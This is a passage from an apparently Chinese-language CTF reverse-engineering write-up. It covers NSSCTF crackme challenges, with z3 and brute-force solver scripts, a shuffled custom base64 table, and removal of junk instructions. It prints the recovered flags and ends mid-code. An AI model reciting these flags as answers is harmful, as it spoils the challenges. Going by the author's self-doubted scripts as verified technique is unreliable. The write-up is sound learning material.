class="number">14</span>] * <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + (<span class="number">4</span> * z3num[<span class="number">3</span>] - <span class="number">5</span> * z3num[<span class="number">4</span>] - <span class="number">30</span> * z3num[<span class="number">5</span>]) * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>] == <span class="number">6191333</span>)</span><br><span class="line">f.add(<span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">10</span> * z3num[<span class="number">9</span>] * <span class="number">9</span> * z3num[<span class="number">8</span>] * <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>] * <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] * <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>] == <span class="number">890415359</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>]</span><br><span class="line">     + <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     + <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>] * <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     - <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>] == <span class="number">23493664</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>] * <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>] * <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     - <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">1967260144</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f.check())</span><br><span class="line"><span class="keyword">while</span> (f.check()==sat):</span><br><span class="line">    condition = []</span><br><span class="line">    m = f.model()</span><br><span class="line">    p =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">20</span>):</span><br><span class="line">        p += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[z3num[i]])))</span><br><span class="line">        condition.append(z3num[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[z3num[i]])))</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    f.add(Or(condition))</span><br><span class="line">    <span class="comment">#hahahathisisfackflag</span></span><br></pre></td></tr></table></figure><p>这里奇怪的是一开始用或逻辑解不出来正确值，但是把所有都与之后却可以得到正确的结果，同时这个不是flag是中间用做加密的值</p><p>又因为后来的算法是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_7FF7CCBC4830</span><span class="params">(<span class="type">char</span> *z3num)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7CCBDB069, v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; j_strlen(flag); ++i )</span><br><span class="line">    last[i] = z3num[j_strlen(flag) - i - <span class="number">1</span>] ^ storn[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的检查是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">sub_7FF7CCBC4770</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7CCBDB069, v1);</span><br><span class="line">  zer0 = <span class="number">0</span>;</span><br><span class="line">  len = j_strlen(flag);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    <span class="keyword">return</span> last[zer0] == strange_num[zer0];     <span class="comment">// 前两位相等，因为是DWORD</span></span><br><span class="line">  <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个可能错了什么，可能前两位相等相当于全部相等。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0x00001207</span>, <span class="number">0</span>x00004CA0, <span class="number">0x00004F21</span>, <span class="number">0x00000039</span>, <span class="number">0</span>x<span class="number">0001A523</span>, <span class="number">0</span>x0000023A, <span class="number">0x00000926</span>, <span class="number">0</span>x00004CA7, <span class="number">0x00006560</span>, <span class="number">0x00000036</span>, <span class="number">0</span>x0001A99B, <span class="number">0</span>x00004CA8, <span class="number">0</span>x0001BBE0, <span class="number">0x00003705</span>, <span class="number">0x00000926</span>, <span class="number">0</span>x<span class="number">000077D3</span>, <span class="number">0x00009A98</span>, <span class="number">0</span>x0000657B, <span class="number">0x00000018</span>, <span class="number">0x00000B11</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br></pre></td></tr></table></figure><p>前面的变换是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">change2</span><span class="params">(<span class="type">int</span> flag, __int64 exenum)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> a; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> exei; <span class="comment">// [rsp+148h] [rbp+128h]</span></span><br><span class="line"></span><br><span class="line">  exei = exenum;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7CCBDB069, exenum);</span><br><span class="line">  a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( exei )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (exei &amp; <span class="number">1</span>) != <span class="number">0</span> )                      <span class="comment">// exenum这一位是奇数</span></span><br><span class="line">      a *= flag;</span><br><span class="line">    flag = flag * flag % <span class="number">1000</span>;</span><br><span class="line">    exei &gt;&gt;= <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">exe = [<span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x7</span>]</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x1207</span>, <span class="number">0x4CA0</span>, <span class="number">0x4F21</span>, <span class="number">0x0039</span>, <span class="number">0x1A523</span>, <span class="number">0x023A</span>, <span class="number">0x0926</span>, <span class="number">0x4CA7</span>, <span class="number">0x6560</span>, <span class="number">0x0036</span>, <span class="number">0x1A99B</span>, <span class="number">0x4CA8</span>, <span class="number">0x1BBE0</span>, <span class="number">0x3705</span>, <span class="number">0x0926</span>, <span class="number">0x77D3</span>, <span class="number">0x9A98</span>, <span class="number">0x657B</span>, <span class="number">0x0018</span>, <span class="number">0x0B11</span>]</span><br><span class="line"></span><br><span class="line">z3num = <span class="built_in">list</span>(<span class="string">&#x27;hahahathisisfackflag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stron = [<span class="number">0</span>]*<span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range (<span class="number">20</span>):</span><br><span class="line">    stron[i] = ord(z3num[<span class="number">19</span> - i]) ^ last[i]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">20</span></span><br><span class="line">def po(flag,b):</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (b):</span><br><span class="line">        <span class="keyword">if</span> (b &amp; <span class="number">1</span> != <span class="number">0</span>):</span><br><span class="line">            a *= flag</span><br><span class="line">        flag = flag * flag % <span class="number">1000</span></span><br><span class="line">        b &gt;&gt;= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">20</span>): </span><br><span class="line">    <span class="keyword">for</span> chrr in range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (po(chrr,exe[i]) == stron[i]):</span><br><span class="line">            flag[i] = chr(chrr)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;.join(flag))</span></span><br><span class="line"><span class="string">#T1e_z3_1s_v1r9_3asy!</span></span><br></pre></td></tr></table></figure><p>爆破得出答案</p><p>总结：</p><p>z3遇到或时计算非常慢，用bitvec型或把或逻辑改成与加快速度</p><p>最后一步遇到不好逆向的也不好z3的，可以用爆破求解因为字符一定在32到127</p><p>一个疑问是：最后一步的b都是一位数，说明a一定是1或者flag的值，stron里面就应该是这个数为什么stron里不是呢</p><h2 id="NSSCTF-2nd-MyBase">[NSSCTF 2nd]MyBase</h2><p>打开ida后发现有tls，需要注意一下</p><p>ida打开之后</p><p>main函数有两个子函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _main();</span><br><span class="line">  test();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先调试看看有没有反调试，然后发现并没有</p><p>第一个_main看不懂，直接进test，里面有一个base64</p><p>打开后根据码表直接解密，但是解不出来。。</p><p>去data里面看看，发现还有码表，进交叉引用的函数发现有一个打乱的代码</p><p>是个c语言函数，有srand函数，所以调试把他找出来</p><p>真：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">YsVO0tvT2o4puZ38j1dwf7MArGPNeQLDRHUK</span>+SChbFanmklWEcgixXJIq6y5B/<span class="number">9</span>z</span><br></pre></td></tr></table></figure><p>一开始加密的：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+86420ywusqomkigecaYWUSQOMKIGECABDFHJLNPRTVXZbdfhjlnprtvxz13579/</span></span><br></pre></td></tr></table></figure><hr><p>然后发现这个打乱代码执行了很多次</p><p>感觉哪里漏了，最后查找交叉引用发现打乱代码在加密里面有一行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( !setjmp(env) )</span><br><span class="line">    exception_handler();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过查阅：</p><p>setjmp和longjmp成对使用实现函数间跳转</p><p>setjmp将函数在此处的上下文保存在jmp_buf结构体中，以供longjmp从此结构体中恢复</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setjmp</span><span class="params">(jmp_buf env)</span>;</span><br></pre></td></tr></table></figure><p>env为保存的结构体变量的位置，若直接调用返回0，否则返回非0（主要指通过longjmp跳转）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">longjmp</span><span class="params">(jmp_buf env, <span class="type">int</span> val)</span>;</span><br></pre></td></tr></table></figure><p>env为由setjmp保存的上下文，val表示longjmp传给setjmp的返回值，如果val=0，则setjmp返回1，否则返回val</p><p>longjmp 不直接返回，而是从 setjmp 函数中返回，longjmp 执行完之后，程序就像刚从 setjmp 函数返回一样。</p><p>所以；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !setjmp(env) )</span><br><span class="line">      exception_handler();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这段代码先执行setjmp(env)，返回0</p><p>进入exception_handler();</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">exception_handler</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  generate_base64_table(base64_table);</span><br><span class="line">  longjmp_0(env, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后更新base64码表</p><p>所以逻辑是：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">对第一组加密</span><br><span class="line">更新</span><br><span class="line">对第二组加密</span><br><span class="line">更新</span><br><span class="line">对第三组加密</span><br><span class="line">更新</span><br><span class="line"><span class="meta prompt_">...</span></span><br></pre></td></tr></table></figure><p>所以密文</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">YkLY</span></span><br><span class="line"><span class="symbol">v1Xj</span></span><br><span class="line"><span class="number">23</span><span class="built_in">X7</span></span><br><span class="line"><span class="symbol">N0E5</span></span><br><span class="line"><span class="symbol">eoFg</span></span><br><span class="line"><span class="symbol">UveK</span></span><br><span class="line"><span class="symbol">eos1</span></span><br><span class="line"><span class="symbol">XS8K</span></span><br><span class="line"><span class="number">9</span>r4g</span><br></pre></td></tr></table></figure><p>码表</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+86420ywusqomkigecaYWUSQOMKIGECABDFHJLNPRTVXZbdfhjlnprtvxz13579/</span><br><span class="line">YsVO0tvT2o4puZ38j1dwf7MArGPNeQLDRHUK+SChbFanmklWEcgixXJIq6y5B/9z</span><br><span class="line">xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ</span><br><span class="line">YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u</span><br><span class="line">xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ</span><br><span class="line">YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u</span><br><span class="line">xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ</span><br><span class="line">YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u</span><br><span class="line">xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ</span><br></pre></td></tr></table></figure><p>然后看了半天</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v10 = (bbb &lt;&lt; <span class="number">8</span>) + (aa &lt;&lt; <span class="number">16</span>) + cc;</span><br><span class="line">    basenum[v14] = base64_table[cc &amp; <span class="number">0x3F</span>];</span><br><span class="line">    basenum[v14 + <span class="number">1</span>] = base64_table[(v10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    basenum[v14 + <span class="number">2</span>] = base64_table[(v10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];</span><br></pre></td></tr></table></figure><p>发现是倒序输出</p><p>那么就直接倒序解码：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">YLkY</span><br><span class="line">jX1v</span><br><span class="line"><span class="number">7</span>X32</span><br><span class="line"><span class="number">5E0</span>N</span><br><span class="line">gFoe</span><br><span class="line">KevU   T0_</span><br><span class="line"><span class="number">1</span>soe   Re_</span><br><span class="line">K8SX</span><br><span class="line">g4r9   <span class="keyword">ld</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">NSSCTF</span><span class="template-variable">&#123;Welc0me_T0_Re_World&#125;</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-3-Team-jump-by-jump-revenge">[NSSRound#3 Team]jump_by_jump_revenge</h2><p>打开后发现main函数不能反编译，感觉有花指令</p><p>然后nop掉两行代码</p><p>获得正确的main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">36</span>]; <span class="comment">// [esp+E8h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_411037(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Str1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">    Str1[i] = (Str1[i] + Str1[(i * i + <span class="number">123</span>) % <span class="number">21</span>]) % <span class="number">96</span> + <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !j_strcmp(Str1, <span class="string">&quot;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nope!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个算法要注意要从后面往前，因为前面的已经被覆盖了</p><p>非常抽象（TAT）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">last = <span class="string">&quot;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&quot;</span></span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">29</span></span><br><span class="line">c = [<span class="number">0</span>]*<span class="number">29</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    c[i] = (i * i + <span class="number">123</span>) % <span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="comment">#flag[i] = (flag[i] + flag[c[i]]) % 96 + 32</span></span><br><span class="line">    <span class="keyword">if</span> (i &gt; c[i]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            uuk = (<span class="built_in">ord</span>(last[i])-<span class="number">32</span>)+ j * <span class="number">96</span> -<span class="built_in">ord</span>(last[c[i]])</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">31</span>&lt; uuk &lt; <span class="number">127</span>):</span><br><span class="line">                flag[i]=uuk</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            uuk = (<span class="built_in">ord</span>(last[i])-<span class="number">32</span>)+ j * <span class="number">96</span> -flag[c[i]]</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">31</span>&lt; uuk &lt; <span class="number">127</span>):</span><br><span class="line">                flag[i]=uuk</span><br><span class="line">u = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    u += <span class="built_in">chr</span>(flag[i])</span><br><span class="line"><span class="built_in">print</span>(u) </span><br><span class="line"><span class="comment">#NSSCTF&#123;Jump_b9_jump!_r3V3n9e&#125;</span></span><br></pre></td></tr></table></figure><p>总结：逆向加密算法时要注意是递推式的还是映射式的</p><p>看了看大佬的wp，好简洁：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ciper=<span class="string">&#x27;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(ciper)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    tmp=ord(ciper[i])<span class="number">-32</span>-ord(ciper[(i*i+<span class="number">123</span>)%<span class="number">21</span>])</span><br><span class="line">    <span class="keyword">while</span>(tmp&lt;<span class="number">33</span>):</span><br><span class="line">        tmp+=<span class="number">96</span></span><br><span class="line">    ciper=ciper[:i]+chr(tmp)+ciper[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">print(ciper)</span><br></pre></td></tr></table></figure><h2 id="NSSRound-2-Able-findxenny">[NSSRound#2 Able]findxenny</h2><p>打开main函数看看，对输入的flag的检查的函数返回值是本身？？没理解暂时跳过，看到最后的检查有三个check</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">check1</span>(*v14) || (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">check2</span>(*v15) || (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">check3</span>(*v16) )</span><br><span class="line">   &#123;</span><br><span class="line">     v10 = <span 